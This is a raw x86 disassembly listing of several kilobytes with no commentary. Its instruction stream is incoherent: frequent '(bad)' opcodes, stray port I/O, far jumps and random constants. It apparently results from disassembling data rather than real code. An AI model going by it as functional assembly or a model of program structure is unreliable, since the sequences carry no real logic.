  4103b6:	sub    BYTE PTR [esi-0x17618718],bh
  4103bc:	push   eax
  4103bd:	test   eax,0x5d95338e
  4103c2:	push   edi
  4103c3:	outs   dx,BYTE PTR ds:[esi]
  4103c4:	fldcw  WORD PTR ds:0xf47f6cc3
  4103ca:	ret    
  4103cb:	retf   0x753d
  4103ce:	shl    dh,0xc9
  4103d1:	stos   BYTE PTR es:[edi],al
  4103d2:	and    DWORD PTR [ecx],0xde39f572
  4103d8:	rcl    ebp,0x15
  4103db:	pop    edx
  4103dc:	jge    0x4103ab
  4103de:	add    BYTE PTR [ecx+0xc923bd9],0x2e
  4103e5:	lahf   
  4103e6:	sbb    ch,0x54
  4103e9:	sub    al,0xc4
  4103eb:	out    dx,al
  4103ec:	fldcw  WORD PTR [edi-0x26e1a41a]
  4103f2:	not    DWORD PTR [ecx]
  4103f4:	cwde   
  4103f5:	sbb    DWORD PTR cs:[edi+0x1ecef9a2],edx
  4103fc:	mov    ecx,0xc90673af
  410401:	daa    
  410402:	inc    esp
  410403:	inc    edi
  410404:	push   cs
  410405:	jge    0x410401
  410407:	jne    0x4103a9
  410409:	dec    esp
  41040a:	shr    DWORD PTR [ebx+ebx*1-0x48],cl
  41040e:	xchg   WORD PTR [ebx],bp
  410411:	sar    al,1
  410413:	fwait
  410414:	adc    dl,BYTE PTR ds:0x5567103d
  41041a:	jnp    0x41042f
  41041c:	jmp    0x346f:0xbe8f1734
  410423:	int    0xda
  410425:	popa   
  410426:	or     BYTE PTR [esi-0x53],0x68
  41042a:	mov    dl,ah
  41042c:	pop    ebx
  41042d:	sbb    dl,0xb
  410430:	jle    0x41042b
  410432:	add    edi,esi
  410434:	cmp    ebp,DWORD PTR ss:[edi+0xe]
  410438:	jbe    0x410475
  41043a:	es fucom st(4)
  41043d:	xchg   ebp,eax
  41043e:	sahf   
  41043f:	daa    
  410440:	out    0x90,eax
  410442:	mov    eax,ds:0x810b59cb
  410447:	mov    edi,ecx
  410449:	xchg   edi,ebp
  41044b:	les    esi,FWORD PTR [edi]
  41044d:	xor    BYTE PTR [ebp-0x23],al
  410450:	and    ecx,0xfffffffb
  410453:	ret    
  410454:	sbb    cl,0x65
  410457:	pop    eax
  410458:	push   esi
  410459:	in     eax,dx
  41045a:	push   esp
  41045b:	pop    eax
  41045c:	jbe    0x4104a4
  41045e:	xlat   BYTE PTR ds:[ebx]
  41045f:	push   ebx
  410460:	mov    dl,0x6f
  410462:	aad    0x35
  410464:	idiv   edi
  410466:	or     DWORD PTR [esp+edi*8+0x21d017c9],esi
  41046d:	imul   edi,DWORD PTR [esi-0x7],0xffffffac
  410471:	imul   esi,DWORD PTR ds:[esi+edx*2-0x4a],0xffffffce
  410477:	pop    ebx
  410478:	add    ch,BYTE PTR [ecx-0x42]
  41047b:	lahf   
  41047c:	(bad)  
  41047e:	cmc    
  41047f:	add    BYTE PTR [ebx-0x79],ah
  410482:	jle    0x41048b
  410484:	xor    ebp,DWORD PTR [edi-0x56]
  410487:	cli    
  410488:	push   edi
  410489:	daa    
  41048a:	mov    al,0xc0
  41048c:	adc    DWORD PTR [ebp-0xc1a3676],esp
  410492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410493:	pop    ebp
  410494:	bound  ebp,QWORD PTR [ebx+0x2f32b657]
  41049a:	into   
  41049b:	fcmovu st,st(6)
  41049d:	push   ss
  41049e:	sbb    ecx,ecx
  4104a0:	mov    ah,0x9c
  4104a2:	fld    st(3)
  4104a4:	mov    bh,0x60
  4104a6:	gs cmp eax,0x87118a2d
  4104ac:	(bad)  
  4104ad:	xchg   esp,eax
  4104ae:	cs mov ah,bh
  4104b1:	mov    ebp,0xc8e77306
  4104b6:	mov    ?,WORD PTR [esi]
  4104b8:	sar    DWORD PTR [edi],cl
  4104ba:	mov    edi,DWORD PTR [esi-0x5]
  4104bd:	out    0xdb,al
  4104bf:	dec    edi
  4104c0:	sub    eax,0x9c25154
  4104c5:	or     dh,BYTE PTR [edi-0x7174061f]
  4104cb:	aam    0x3d
  4104cd:	shr    DWORD PTR [edx+0x78],0x5b
  4104d1:	(bad)  
  4104d3:	out    dx,eax
  4104d4:	loope  0x41048d
  4104d6:	outs   dx,BYTE PTR ds:[esi]
  4104d7:	leave  
  4104d8:	imul   edx,DWORD PTR [eax+0x3af9f7e0],0x1f53cbd2
  4104e2:	pusha  
  4104e3:	jp     0x4104dd
  4104e5:	repz jl 0x4104d5
  4104e8:	dec    ebp
  4104e9:	neg    BYTE PTR [edi]
  4104eb:	cld    
  4104ec:	out    dx,eax
  4104ed:	sub    dl,BYTE PTR [edi-0x40d1f95e]
  4104f3:	pop    es
  4104f4:	xchg   edi,eax
  4104f5:	or     al,0x4b
  4104f7:	test   eax,0xa496c5de
  4104fc:	mov    ds:0x47b5c3a7,eax
  410501:	sbb    eax,0x18291a82
  410506:	mov    esp,0xc999954e
  41050b:	ror    al,1
  41050d:	hlt    
  41050e:	ins    BYTE PTR es:[edi],dx
  41050f:	push   esp
  410510:	xlat   BYTE PTR ds:[ebx]
  410511:	dec    ecx
  410512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410513:	adc    ebp,DWORD PTR [esi]
  410515:	sub    ebp,DWORD PTR [esi]
  410517:	mov    edi,esi
  410519:	pmaxsw mm3,mm1
  41051c:	mov    dh,0x60
  41051e:	lock or BYTE PTR [ecx-0x60],ch
  410522:	int3   
  410523:	cmp    al,0xd9
  410525:	dec    esi
  410526:	lds    eax,FWORD PTR [ebp+0x47]
  410529:	je     0x4104f7
  41052b:	hlt    
  41052c:	call   DWORD PTR [ebp-0x56]
  41052f:	and    DWORD PTR [esp+edi*2],0xffffffd6
  410533:	fnstsw WORD PTR [ebx+ebp*1]
  410536:	cwde   
  410537:	(bad)  
  410538:	stos   BYTE PTR es:[edi],al
  410539:	push   ebx
  41053a:	jmp    0x70b296bf
  41053f:	fnstenv [ebx+0x6076962d]
  410545:	xchg   esp,eax
  410546:	cli    
  410547:	das    
  410548:	jmp    0x9c1:0xd9d52844
  41054f:	sub    DWORD PTR [ebp-0x315b33e3],edi
  410555:	daa    
  410556:	jg     0x4104fd
  410558:	mov    ch,0x54
  41055a:	stc    
  41055b:	loope  0x410529
  41055d:	jnp    0x4105a0
  41055f:	dec    esp
  410560:	adc    BYTE PTR [eax-0x6dd69501],dl
  410566:	frstor [edx]
  410568:	sar    BYTE PTR [esi],0x4d
  41056b:	add    eax,0xc3206642
  410570:	xor    eax,0x83cb2b56
  410575:	dec    ecx
  410576:	add    ebp,esp
  410578:	or     bh,bl
  41057a:	repz (bad) 
  41057d:	mov    ecx,ds
  41057f:	addr16 test bl,0xaf
  410583:	jl     0x4105a5
  410585:	inc    esi
  410586:	adc    al,0x4
  410588:	nop
  410589:	(bad)
  41058c:	xor    cl,ah
  41058e:	std    
  41058f:	stos   BYTE PTR es:[edi],al
  410590:	mov    ebp,0xa32bafd2
  410595:	outs   dx,DWORD PTR ds:[esi]
  410596:	iret   
  410597:	adc    al,0x48
  410599:	lahf   
  41059a:	jmp    0x410596
  41059c:	sbb    ah,BYTE PTR [edi]
  41059e:	(bad)  [ecx]
  4105a0:	pop    edx
  4105a1:	cmp    al,0x28
  4105a3:	mov    eax,0x9988d6eb
  4105a8:	dec    esp
  4105a9:	adc    ah,dh
  4105ab:	jecxz  0x4105eb
  4105ad:	das    
  4105ae:	sbb    bh,BYTE PTR [eax+0x37]
  4105b1:	push   cs
  4105b2:	cmp    dh,cl
  4105b4:	or     eax,DWORD PTR [ecx+ecx*1-0x29]
  4105b8:	repz dec edi
  4105ba:	add    ch,ah
  4105bc:	ja     0x41053e
  4105be:	jge    0x410548
  4105c0:	jne    0x41055f
  4105c2:	add    ebx,DWORD PTR [eax-0x74]
  4105c5:	mov    cl,BYTE PTR [esp+esi*8+0xa0598a1]
  4105cc:	sahf   
  4105cd:	arpl   bp,bp
  4105cf:	or     BYTE PTR [ebx+edi*2],0x45
  4105d3:	aad    0x4c
  4105d5:	fidivr DWORD PTR [edx+eiz*2-0x80]
  4105d9:	lea    esp,[esi]
  4105db:	jno    0x41060e
  4105dd:	xor    ah,cl
  4105df:	pusha  
  4105e0:	pop    esi
  4105e1:	jecxz  0x410637
  4105e3:	push   0x79
  4105e5:	in     eax,0x4e
  4105e7:	outs   dx,DWORD PTR ds:[esi]
  4105e8:	icebp  
  4105e9:	jle    0x4105e4
  4105eb:	sub    edi,esp
  4105ed:	ret    0xe80f
  4105f0:	jbe    0x4105e5
  4105f2:	fmul   QWORD PTR [ebx+0x2c]
  4105f5:	or     esp,DWORD PTR [ecx-0x64a61410]
  4105fb:	cmc    
  4105fc:	jo     0x41060a
  4105fe:	and    BYTE PTR [esi],cl
  410600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410601:	or     ebp,edx
  410603:	imul   esp,ebp,0xfffffff2
  410606:	cwde   
  410607:	imul   edi,DWORD PTR [edx-0x3e],0x7325850a
  41060e:	test   DWORD PTR [edx],ecx
  410610:	mov    ah,0xa4
  410612:	mov    DWORD PTR [esi],ebp
  410614:	or     BYTE PTR [eax+0x745c2d8b],al
  41061a:	and    al,BYTE PTR [edi+0x7a]
  41061d:	ss lahf 
  41061f:	test   cl,bh
  410621:	adc    cl,BYTE PTR [edi-0x25c68db4]
  410627:	je     0x410654
  410629:	push   cs
  41062a:	push   esp
  41062b:	sbb    al,0x2
  41062d:	aas    
  41062e:	repz pusha 
  410630:	(bad)
  410633:	and    al,BYTE PTR [ebp-0x6e]
  410636:	push   ebx
  410637:	sub    al,0x29
  410639:	lods   al,BYTE PTR ds:[esi]
  41063a:	xchg   edx,eax
  41063b:	(bad)  
  41063c:	mov    BYTE PTR [eax+0x1f],cl
  41063f:	sahf   
  410640:	fstp   TBYTE PTR [eax-0x48]
  410643:	pop    ecx
  410644:	out    dx,al
  410645:	dec    ebx
  410646:	push   ds
  410647:	push   0xffffffc7
  410649:	inc    edx
  41064a:	and    eax,0xabbc4453
  41064f:	jecxz  0x410685
  410651:	pop    ds
  410652:	cmp    BYTE PTR [eax-0x2e1f7bf1],ch
  410658:	nop
  410659:	jae    0x41065e
  41065b:	jo     0x4105e3
  41065d:	xchg   ebp,eax
  41065e:	dec    ecx
  41065f:	repz pop edx
  410661:	out    0xcf,al
  410663:	lods   al,BYTE PTR ds:[esi]
  410664:	xchg   esi,eax
  410665:	mov    bl,0x38
  410667:	cmc    
  410668:	or     DWORD PTR ss:0x80bff660,esp
  41066f:	sbb    al,0x10
  410671:	inc    ebx
  410672:	mov    dl,0xf2
  410674:	mov    edx,0x36786a8d
  410679:	fcmovb st,st(3)
  41067b:	push   edi
  41067c:	mov    bh,0x9c
  41067e:	or     eax,DWORD PTR [ebx+0x5d]
  410681:	or     al,0x17
  410683:	xchg   ebp,eax
  410684:	cld    
  410685:	mov    ebp,0xa2529266
  41068a:	mov    bl,0xa7
  41068c:	cld    
  41068d:	pop    ds
  41068e:	fbstp  TBYTE PTR [edi+0x4a0c4f1e]
  410694:	aas    
  410695:	ds sub al,0xf5
  410698:	mov    dh,0x76
  41069a:	ret    
  41069b:	xchg   edx,eax
  41069c:	xor    dl,BYTE PTR [ecx+0x5d5136a3]
  4106a2:	lods   al,BYTE PTR ds:[esi]
  4106a3:	and    esp,DWORD PTR [edx-0x4b]
  4106a6:	popa   
  4106a7:	jmp    0x980932df
  4106ac:	adc    ebx,ebx
  4106ae:	rcr    BYTE PTR [esi+esi*8],0x9b
  4106b2:	aaa    
  4106b3:	push   esp
  4106b4:	mul    BYTE PTR [edx+0x69b7b465]
  4106ba:	mov    al,0x19
  4106bc:	jnp    0x4106cd
  4106be:	or     edx,0x6ebeee8f
  4106c4:	xor    ah,bl
  4106c6:	sbb    ebp,edx
  4106c8:	pop    esi
  4106c9:	mov    es,edx
  4106cb:	add    BYTE PTR [ebx-0x1610a3aa],0xd6
  4106d2:	pusha  
  4106d3:	(bad)  
  4106d4:	xchg   edi,eax
  4106d5:	mov    dl,0x7d
  4106d7:	aam    0x23
  4106d9:	std    
  4106da:	sbb    BYTE PTR [esi+0x2bd1d682],0x49
  4106e1:	(bad)  
  4106e2:	outs   dx,DWORD PTR ds:[esi]
  4106e3:	and    DWORD PTR [ebx],ebp
  4106e5:	jle    0x4106a8
  4106e7:	fldlg2 
  4106e9:	std    
  4106ea:	or     eax,DWORD PTR ds:0xb2e949fe
  4106f0:	loope  0x410724
  4106f2:	sub    BYTE PTR [ecx],ch
  4106f4:	sbb    dh,BYTE PTR [ecx-0x6db26667]
  4106fa:	cwde   
  4106fb:	aas    
  4106fc:	add    al,0x92
  4106fe:	dec    edi
  4106ff:	(bad)  
  410700:	pop    esp
  410701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410702:	test   ebx,eax
  410704:	stos   DWORD PTR es:[edi],eax
  410705:	loope  0x410691
  410707:	ds test al,0xa9
  41070a:	mov    cl,ah
  41070c:	and    esi,DWORD PTR [ecx-0x1c]
  41070f:	ds jmp 0xd9d0:0x3b8a774a
  410717:	sbb    cl,cl
  410719:	fmul   QWORD PTR [ecx+0x54a8b849]
  41071f:	xchg   edx,eax
  410720:	ins    BYTE PTR es:[edi],dx
  410721:	xor    DWORD PTR [ebp+0x41],eax
  410724:	mov    bl,0x73
  410726:	adc    esp,DWORD PTR [ebp-0x18]
  410729:	test   al,0xbb
  41072b:	add    DWORD PTR [eax-0x79],edi
  41072e:	xchg   DWORD PTR [ebp+0x7ac37a42],esi
  410734:	jge    0x41073b
  410736:	leave  
  410737:	in     eax,0xbd
  410739:	in     al,0xfd
  41073b:	dec    eax
  41073c:	add    DWORD PTR [ebx-0x3],ebp
  41073f:	ss aas 
  410741:	sbb    edx,DWORD PTR [edi]
  410743:	hlt    
  410744:	scas   eax,DWORD PTR es:[edi]
  410745:	dec    esp
  410746:	popf   
  410747:	cmp    BYTE PTR [esi-0x3ea3d06b],0xc8
  41074e:	xchg   BYTE PTR [ebx+0x16e87bf3],dh
  410754:	fcomp  QWORD PTR [eax]
  410756:	lods   eax,DWORD PTR ds:[esi]
  410757:	out    0xbf,eax
  410759:	pop    es
  41075a:	dec    ebx
  41075b:	out    0x89,eax
  41075d:	dec    ebx
  41075e:	ja     0x4107a6
  410760:	test   eax,0xa401f9d
  410765:	or     al,0x3
  410767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410768:	imul   esp,esi,0xb55e3706
  41076e:	fisttp DWORD PTR [edi-0x71]
  410771:	out    dx,al
  410772:	mov    DWORD PTR ds:0x1540b469,edi
  410778:	sub    DWORD PTR [ebp-0xfc3d16c],esi
  41077e:	mov    WORD PTR [edx*2+0x7e484488],ds
  410785:	retf   0x399a
  410788:	daa    
  410789:	inc    ebp
  41078a:	cmc    
  41078b:	fisubr WORD PTR [ebp+0x10]
  41078e:	inc    esi
  41078f:	push   ecx
  410790:	or     al,0x15
  410792:	fwait
  410793:	pop    esp
  410794:	retf   0x6e75
  410797:	push   edi
  410798:	push   edi
  410799:	icebp  
  41079a:	aad    0x54
  41079c:	and    BYTE PTR [ebp-0x64],dl
  41079f:	mov    bl,0x57
  4107a1:	push   ss
  4107a2:	es cmp ebx,edx
  4107a5:	pop    esi
  4107a6:	cmp    DWORD PTR [esp+edi*2+0x77c23db8],0x5a
  4107ae:	jns    0x41079a
  4107b0:	pop    eax
  4107b1:	pop    esp
  4107b2:	and    DWORD PTR [eax+eiz*1+0x257f8372],0xffffff9b
  4107ba:	add    dl,bh
  4107bc:	adc    DWORD PTR [ecx+0x32],ebx
  4107bf:	sahf   
  4107c0:	cdq    
  4107c1:	imul   edx,DWORD PTR [ebx+0x3e],0x141cde93
  4107c8:	mov    ?,WORD PTR [ebp-0xbf37bb]
  4107ce:	pop    edi
  4107cf:	mov    bl,0xec
  4107d1:	xchg   ecx,eax
  4107d2:	pop    edi
  4107d3:	mov    cl,BYTE PTR [edi+0x51]
  4107d6:	pop    ebp
  4107d7:	test   BYTE PTR [esp+ebp*8+0xb],ch
  4107db:	jmp    0xa315:0x5ea38520
  4107e2:	loope  0x41080c
  4107e4:	pop    DWORD PTR [eax]
  4107e6:	mov    dh,0x66
  4107e8:	popf   
  4107e9:	xor    BYTE PTR [esi+0x6c],bh
  4107ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ed:	mov    ebx,0xa8fdafc9
  4107f2:	jle    0x410865
  4107f4:	dec    ebx
  4107f5:	mov    ebp,esp
  4107f7:	repz pop ds
  4107f9:	(bad)  
  4107fb:	shr    BYTE PTR [esi+edi*4+0x5eb82d8a],1
  410802:	arpl   WORD PTR [edi],dx
  410804:	jns    0x410860
  410806:	leave  
  410807:	mov    ds,WORD PTR [ecx]
  410809:	push   ebp
  41080a:	sub    bl,cl
  41080c:	data16 or al,0xee
  41080f:	aaa    
  410810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410811:	nop
  410812:	mov    edi,DWORD PTR [ebp+eax*4-0x387037ac]
  410819:	lods   eax,DWORD PTR ds:[esi]
  41081a:	test   al,0x8f
  41081c:	sub    dl,BYTE PTR [esi+0x67]
  41081f:	in     eax,0x31
  410821:	dec    edx
  410822:	xchg   ecx,eax
  410823:	or     al,BYTE PTR [edi]
  410825:	dec    esp
  410826:	sbb    BYTE PTR [eax],ch
  410828:	mov    ch,0xad
  41082a:	shr    DWORD PTR [edi+0xa],cl
  41082d:	(bad)  
  41082e:	popf   
  41082f:	pop    esi
  410830:	pop    ebp
  410831:	cmc    
  410832:	inc    edi
  410833:	mov    bh,0xb7
  410835:	fnstenv [edx-0x13]
  410838:	sbb    DWORD PTR [edi-0x41],ecx
  41083b:	dec    ebx
  41083c:	lock je 0x41081e
  41083f:	aaa    
  410840:	out    0xca,al
  410842:	(bad)  
  410843:	jns    0x4107d0
  410845:	je     0x410873
  410847:	and    dh,BYTE PTR [eax-0x59b161ba]
  41084d:	push   ss
  41084e:	(bad)  
  41084f:	jge    0x410847
  410851:	pop    edi
  410852:	rcl    DWORD PTR [ebx-0x5e2fd877],1
  410858:	dec    edx
  410859:	mov    ebx,0x54b24327
  41085e:	cld    
  41085f:	add    DWORD PTR [esi],0x5d14385c
  410865:	push   cs
  410866:	outs   dx,DWORD PTR ds:[esi]
  410867:	ret    
  410868:	mov    ds:0xf36e5e54,eax
  41086d:	or     DWORD PTR [esi-0x636a470b],eax
  410873:	jp     0x410840
  410875:	aas    
  410876:	mov    esp,0xde457f5b
  41087b:	test   al,0xc7
  41087d:	hlt    
  41087e:	jmp    0x21ac:0x2273b84d
  410885:	push   eax
  410886:	dec    esi
  410887:	ud0    esi,DWORD PTR [edx+0x4a3c246d]
  41088e:	push   es
  41088f:	clc    
  410890:	cmp    esi,edx
  410892:	jno    0x4108fa
  410894:	push   ebp
  410895:	xchg   edi,eax
  410896:	iret   
  410897:	sar    BYTE PTR [esi-0x39],0x7f
  41089b:	mov    eax,0xaffe6d2f
  4108a0:	push   esp
  4108a1:	pushf  
  4108a2:	pavgw  mm7,mm0
  4108a5:	lds    ebp,FWORD PTR [edx]
  4108a7:	inc    esi
  4108a8:	mov    BYTE PTR [edx+ecx*2+0xd],bh
  4108ac:	sbb    BYTE PTR [ecx+0x50],dh
  4108af:	nop
  4108b0:	and    DWORD PTR [ebx+0x37],eax
  4108b3:	pop    ecx
  4108b4:	push   ebp
  4108b5:	mov    edx,esi
  4108b7:	bnd js 0x410842
  4108ba:	xor    esp,DWORD PTR [esi]
  4108bc:	cmp    al,0xee
  4108be:	call   0x1854:0xdf8268d6
  4108c5:	push   edi
  4108c6:	ds pusha 
  4108c8:	pop    es
  4108c9:	(bad)
  4108cc:	jecxz  0x410918
  4108ce:	jmp    0xe2ff:0xf131e1a3
  4108d5:	mov    esi,0xfb6e784c
  4108da:	stos   DWORD PTR es:[edi],eax
  4108db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108dc:	stos   DWORD PTR es:[edi],eax
  4108dd:	jle    0x410902
  4108df:	jmp    0x8859:0x7bfad7c1
  4108e6:	hlt    
  4108e7:	or     al,0x86
  4108e9:	cmp    eax,0x703af172
  4108ee:	push   edx
  4108ef:	mov    eax,0xa33d932c
  4108f4:	mov    al,ds:0x3329f010
  4108f9:	inc    ecx
  4108fa:	dec    edx
  4108fb:	push   ss
  4108fc:	test   BYTE PTR [eax+0x399ed0e],dh
  410902:	sub    eax,DWORD PTR [eax]
  410904:	xchg   ebp,eax
  410905:	test   esp,esi
  410907:	push   0xbc1583eb
  41090c:	jmp    0x410915
  41090e:	hlt    
  41090f:	jae    0x41098a
  410911:	adc    eax,0x36656bf7
  410916:	js     0x4108f5
  410918:	push   ss
  410919:	das    
  41091a:	xchg   edi,eax
  41091b:	push   ecx
  41091c:	add    BYTE PTR [ecx-0x2886325c],0xf8
  410923:	inc    ebx
  410924:	fisubr WORD PTR [edx+0x7883b816]
  41092a:	stc    
  41092b:	mov    BYTE PTR [ebp-0x5e],dl
  41092e:	mov    eax,0xcf123283
  410933:	xor    eax,0x73ebbbbb
  410938:	sar    DWORD PTR ds:0x2685f144,0xab
  41093f:	sub    edi,DWORD PTR [ebx]
  410941:	jl     0x4108f0
  410943:	arpl   WORD PTR [ebp-0x50],dx
  410946:	adc    BYTE PTR [ecx],cl
  410948:	icebp  
  410949:	aad    0x92
  41094b:	(bad)  [ebp-0x34]
  41094e:	cld    
  41094f:	jne    0x4108d8
  410951:	bound  eax,QWORD PTR [ebx+0x3d7158d1]
  410957:	(bad)  
  410958:	sahf   
  410959:	test   al,0xb3
  41095b:	test   eax,0xcc8b6489
  410960:	aas    
  410961:	outs   dx,BYTE PTR ds:[esi]
  410962:	in     al,dx
  410963:	(bad)  
  410964:	mov    ebp,0xb036ac0d
  410969:	and    edi,DWORD PTR [eax]
  41096b:	dec    edi
  41096c:	shl    esp,1
  41096e:	push   ds
  41096f:	xor    al,0x6c
  410971:	ins    DWORD PTR es:[edi],dx
  410972:	jno    0x410906
  410974:	loop   0x4109a4
  410976:	push   ss
  410977:	hlt    
  410978:	in     al,dx
  410979:	dec    edi
  41097a:	shl    edx,cl
  41097c:	adc    ebx,DWORD PTR [ecx-0x388d4ff2]
  410982:	lods   eax,DWORD PTR ds:[esi]
  410983:	xchg   esp,eax
  410984:	clc    
  410985:	sti    
  410986:	(bad)  
  410987:	mov    WORD PTR [edi-0x9fe5ff6],?
  41098d:	ret    
  41098e:	retf   0x601e
  410991:	dec    ecx
  410992:	jmp    FWORD PTR [edi+ecx*8]
  410995:	(bad)  
  410996:	cli    
  410997:	mov    bh,ah
  410999:	cmp    al,0xbf
  41099b:	xor    esp,DWORD PTR [esi]
  41099d:	mov    ecx,0xb9b22486
  4109a2:	(bad)  
  4109a3:	int    0x94
  4109a5:	fnstcw WORD PTR [eax-0x4fc1afd2]
  4109ab:	imul   eax,esp,0xf621c257
  4109b1:	dec    eax
  4109b2:	mov    ah,0x1
  4109b4:	inc    edx
  4109b5:	jle    0x4109bf
  4109b7:	imul   ecx,DWORD PTR [edi],0x1f
  4109ba:	adc    DWORD PTR [edi+edi*2+0x6dc5845a],eax
  4109c1:	xor    BYTE PTR [ebp+0x3d21492c],0x46
  4109c8:	icebp  
  4109c9:	inc    eax
  4109ca:	dec    ebp
  4109cb:	mov    WORD PTR [edi+0x5c],?
  4109ce:	sub    bl,BYTE PTR [ebx+0x4f736623]
  4109d4:	aam    0x1
  4109d6:	cli    
  4109d7:	cld    
  4109d8:	mov    ch,0x55
  4109da:	jmp    0x5e0fe933
  4109df:	xchg   esp,eax
  4109e0:	push   esp
  4109e1:	das    
  4109e2:	fcmovnb st,st(7)
  4109e4:	or     DWORD PTR [ecx],ebx
  4109e6:	dec    eax
  4109e7:	or     al,0x92
  4109e9:	xchg   edx,eax
  4109ea:	dec    DWORD PTR [edi+edi*4-0x488215b3]
  4109f1:	ret    0x6213
  4109f4:	imul   ebx,DWORD PTR [ebx],0xffffff89
  4109f7:	retf   0xc4b6
  4109fa:	lahf   
  4109fb:	dec    esi
  4109fc:	jns    0x410a4a
  4109fe:	hlt    
  4109ff:	(bad)  
  410a00:	(bad)  
  410a01:	(bad)  
  410a02:	jnp    0x41098a
  410a04:	leave  
  410a05:	daa    
  410a06:	jge    0x410a21
  410a08:	mov    eax,cs
  410a0a:	pop    eax
  410a0b:	inc    ebx
  410a0c:	sub    al,0x1c
  410a0e:	adc    edx,DWORD PTR [ecx+0xa]
  410a11:	mov    ds:0x63cd3ddb,eax
  410a16:	jmp    0x559ab11a
  410a1b:	jl     0x4109c7
  410a1d:	loope  0x4109b6
  410a1f:	inc    eax
  410a20:	mov    ah,0xfa
  410a22:	test   eax,0x4566eddb
  410a27:	pop    esp
  410a28:	rcr    BYTE PTR [edx+0x79],cl
  410a2b:	mov    ds:0x341a3648,al
  410a30:	(bad)  
  410a31:	sub    esi,DWORD PTR [ecx-0x10]
  410a34:	sub    BYTE PTR [esp+ecx*8-0x6579e847],bl
  410a3b:	shl    DWORD PTR [eax],cl
  410a3d:	push   0x64928aa0
  410a42:	out    0x3,eax
  410a44:	imul   BYTE PTR [edi]
  410a46:	add    esp,DWORD PTR [ebx]
  410a48:	scas   eax,DWORD PTR es:[edi]
  410a49:	rol    esi,1
  410a4b:	popa   
  410a4c:	cmp    eax,0xddf50501
  410a51:	xchg   BYTE PTR [edx+eiz*4-0x48],bl
  410a55:	mov    eax,ds:0x1ae0b256
  410a5a:	inc    ebx
  410a5b:	pop    ds
  410a5c:	jno    0x410ab9
  410a5e:	in     al,dx
  410a5f:	cmp    bh,ah
  410a61:	jne    0x410a10
  410a63:	scas   eax,DWORD PTR es:[edi]
  410a64:	das    
  410a65:	sub    bl,BYTE PTR [edx-0x24]
  410a68:	hlt    
  410a69:	dec    ebp
  410a6a:	push   ecx
  410a6b:	jg     0x410a4d
  410a6d:	dec    esi
  410a6e:	cmp    BYTE PTR [ecx+esi*8],dh
  410a71:	dec    ecx
  410a72:	repnz cli 
  410a74:	int3   
  410a75:	retf   0xb142
  410a78:	sub    BYTE PTR [ebx-0x58c1a196],0xe1
  410a7f:	mov    dl,0xa9
  410a81:	stos   BYTE PTR es:[edi],al
  410a82:	pop    edx
  410a83:	dec    edx
  410a84:	imul   esi,DWORD PTR [ebx+0x31],0x7adcb680
  410a8b:	hlt    
  410a8c:	sbb    BYTE PTR [esi+ebx*8],bl
  410a8f:	jb     0x410a12
  410a91:	dec    ecx
  410a92:	sub    cl,BYTE PTR [edi]
  410a94:	loop   0x410a1f
  410a96:	cmp    bl,ah
  410a98:	mov    ds:0x34590d7c,al
  410a9d:	call   0xed5f:0x7b767efe
  410aa4:	sub    esp,DWORD PTR [eax-0x30]
  410aa7:	(bad)  
  410aa8:	fnstcw WORD PTR [edi+ebx*2+0x5d297a37]
  410aaf:	push   ds
  410ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ab1:	popa   
  410ab2:	fbstp  TBYTE PTR [ecx]
  410ab4:	inc    ecx
  410ab5:	mov    ds:0xda47f4cf,al
  410aba:	mov    WORD PTR [ebp-0x47],?
  410abd:	dec    DWORD PTR [eax]
  410abf:	sbb    ebx,edi
  410ac1:	or     dl,bh
  410ac3:	in     eax,0xae
  410ac5:	adc    al,0x86
  410ac7:	cmp    al,0x9
  410ac9:	sbb    eax,0xcb387246
  410ace:	pop    ds
  410acf:	push   eax
  410ad0:	ret    
  410ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ad2:	ss jg  0x410a86
  410ad5:	fs test esp,ebp
  410ad8:	sub    ebp,edx
  410ada:	shl    BYTE PTR [eax+0x7fa06383],cl
  410ae0:	mov    BYTE PTR [ecx+0x33],0x10
  410ae4:	lods   al,BYTE PTR ds:[esi]
  410ae5:	push   edx
  410ae6:	xor    eax,0x1926c51c
  410aeb:	xor    edi,DWORD PTR [edi]
  410aed:	popa   
  410aee:	ins    DWORD PTR es:[edi],dx
  410aef:	les    ebp,FWORD PTR [eax-0x3a]
  410af2:	ins    DWORD PTR es:[edi],dx
  410af3:	jmp    0x9a5a4f2f
  410af8:	(bad)  
  410af9:	pop    ds
  410afa:	das    
  410afb:	jp     0x410b77
  410afd:	sar    DWORD PTR [edx-0x76],1
  410b00:	pop    ebx
  410b01:	ss cli 
  410b03:	out    0xde,eax
  410b05:	or     DWORD PTR [esi+0x9],0xf0521dec
  410b0c:	outs   dx,DWORD PTR ds:[esi]
  410b0d:	inc    ecx
  410b0e:	test   ch,bh
  410b10:	jle    0x410b81
  410b12:	mov    ebp,0x216a3d6
  410b17:	icebp  
  410b18:	repnz sub DWORD PTR [ecx-0x8108cb2],0x32
  410b20:	mov    ah,0x12
  410b22:	aas    
  410b23:	mov    esp,0x77f97350
  410b28:	scas   eax,DWORD PTR es:[edi]
  410b29:	js     0x410b81
  410b2b:	inc    edx
  410b2c:	hlt    
  410b2d:	mov    ecx,0xf1aa0c88
  410b32:	loope  0x410b6f
  410b34:	mov    dh,0xb1
  410b36:	jnp    0x410b7a
  410b38:	out    0x7f,eax
  410b3a:	lds    ecx,FWORD PTR [eax]
  410b3c:	xor    eax,0x63cc5e2
  410b41:	in     al,dx
  410b42:	xchg   edx,eax
  410b43:	push   0xffffffba
  410b45:	pop    es
  410b46:	mov    cl,0xce
  410b48:	sbb    al,0x6
  410b4a:	adc    al,0x66
  410b4c:	mov    cl,0x5c
  410b4e:	scas   eax,DWORD PTR es:[edi]
  410b4f:	add    eax,DWORD PTR [ebx-0x1aeeb43]
  410b55:	ds mov al,0x83
  410b58:	mov    esi,0xaa22bf72
  410b5d:	sub    cl,BYTE PTR [edi-0x5b6b94c1]
  410b63:	mov    eax,0x6fb9af6c
  410b68:	pop    ds
  410b69:	sbb    edi,ebp
